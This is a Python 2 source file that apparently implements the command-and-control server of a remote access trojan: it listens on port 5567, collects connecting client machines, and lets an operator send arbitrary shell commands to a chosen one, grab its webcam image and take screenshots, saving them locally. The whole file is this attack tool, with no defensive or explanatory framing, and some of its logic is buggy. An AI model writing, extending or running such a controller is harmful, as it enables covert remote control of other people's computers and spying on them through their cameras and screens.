import socket, sys, os
    
host = ''
port = 5567

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))

s.listen(128)

clients =[]
socks = []
active = False

def refresh():
    os.system("cls")
    if len(clients)>0:
        for j in range(0, len(clients)):
            print "[" + str(j+1) + "] Client: " + clients[j] + "\n"

    else:
        print "..\n"

    print "[0]Exit"
    print "Press Ctrl+ C to interact with client. "
    

while True:
    refresh()
    
    try:
        s.settimeout(3)
        try:
            conn, addr = s.accept()
        except socket.timeout:
            continue
    
        if (conn):
            s.settimeout(None)
            socks.append(conn)
            clients.append(str(addr))
            
    except KeyboardInterrupt:
        refresh()

        activate = input("\nEnter the client option: ")

        if activate == 0:
            print "\nExiting...\n"
            for j in (0, len(socks)):
                socks[j].close()
            sys.exit()

        activate -=1

        os.system("cls")
        active = True

    if active == True:
        cmd = raw_input('>')

    while active: 
        try:

            if cmd == 'quit':
                print "Exit.\n"
                socks[activate].close()
                socks.remove(socks[activate])
                clients.remove(clients[activate])
                refresh()
                active = False

            elif cmd == "webcam":
                socks[activate].send(cmd)
                image = socks[activate].recv(1024 * 1024 * 1024)
                f = open("remote.jpg", "wb")
                f.write(image)
                f.close()

            elif cmd == 'screenshot':
                conn.send(cmd)
                screenshot = conn.recv(1024 * 1024)
                g = open("screenshot.jpg", "wb")
                g.write(screenshot)
                g.close()
                        
            else:            
                socks[activate].send(cmd)
                data = socks[activate].recv(1024 * 1024)
                print data

            cmd = raw_input()

        except: pass

        
        
    



        
    
